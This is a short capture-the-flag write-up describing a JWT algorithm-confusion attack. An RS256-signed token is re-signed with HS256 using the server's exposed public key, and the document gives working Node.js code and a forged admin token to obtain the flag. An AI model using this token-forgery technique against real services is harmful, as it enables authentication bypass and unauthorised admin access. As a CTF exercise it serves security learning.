# Auth0 +2

This app suffers from an attack that forces the server to switch from using an assymetric algorithm to verify the signed JWT to using a symmetric one.

The initial JWT is signed using the `RS256` algorithm, we can take this JWT, decode it, change the user variable and then resign it using the symmetric `HS265` algorithm and the `public_key.pem` file found under `/pki` which can be found using gobuster/ffuf/wfuzz.

NodeJS is handy to do this:

```js
> const jwt = require("jsonwebtoken")
> const fs = require("fs")

> var publicKey = fs.readFileSync("public_key.pem")

> jwt.sign({user: "admin"}, publicKey, {algorithm: "HS256"})

'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE1OTkxMTg3NjV9.EhkFZ0b82SSAJueXRkD9D7pv7qpXHY_vnPlnIOB1BQk'
```

Replacing our existing JWT with this new one, they server can successfully verify it without throwing an error and therefore treats the token as valid, and trusting all of the data inside the data portion.

Therefore it believes we are `admin` and presents us the flag!
